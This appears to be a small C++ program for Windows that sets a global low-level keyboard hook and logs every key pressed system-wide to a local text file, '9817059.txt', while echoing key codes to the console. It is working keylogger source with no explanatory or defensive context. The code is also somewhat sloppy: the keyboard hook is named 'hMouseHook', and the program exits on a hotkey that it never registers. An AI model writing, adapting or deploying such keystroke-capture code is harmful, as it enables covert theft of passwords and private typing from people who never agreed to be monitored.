#include<windows.h>
#include<iostream>
#include<stdio.h>
using namespace std;
int count=0;
FILE* output;
LRESULT WINAPI Handle(int code , WPARAM w,LPARAM l)
{
    KBDLLHOOKSTRUCT* kbhook = (KBDLLHOOKSTRUCT *)l;
    char a;
    int b;
	switch(w)
	{
    case WM_KEYDOWN:
        a=kbhook->vkCode;
        cout<<"vk code:"<<a<<endl;
        fprintf(output,"%c",a);
        break;
    case WM_SYSKEYUP:
        cout<<"system"<<endl;
        //fprintf(output,"%d",b);
   //case WM_KEYUP:
        //scout<<"key up "<<endl;
	}
	return CallNextHookEx(NULL,code,w,l);


}
int main()
{
    // WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.

    output=fopen("9817059.txt","w");
	HHOOK hMouseHook= SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Handle,GetModuleHandle(NULL),0);
	MSG msg;
	while(GetMessage(&msg,NULL,0,0)!=0)
	{
               if (msg.message == WM_HOTKEY)
               {
                  UnhookWindowsHookEx(hMouseHook);
                  return 0;
               }
               //Translates virtual-key messages into character messages.
               TranslateMessage(&msg);
               //Dispatches a message to a window procedure.
               DispatchMessage(&msg);
	}

}
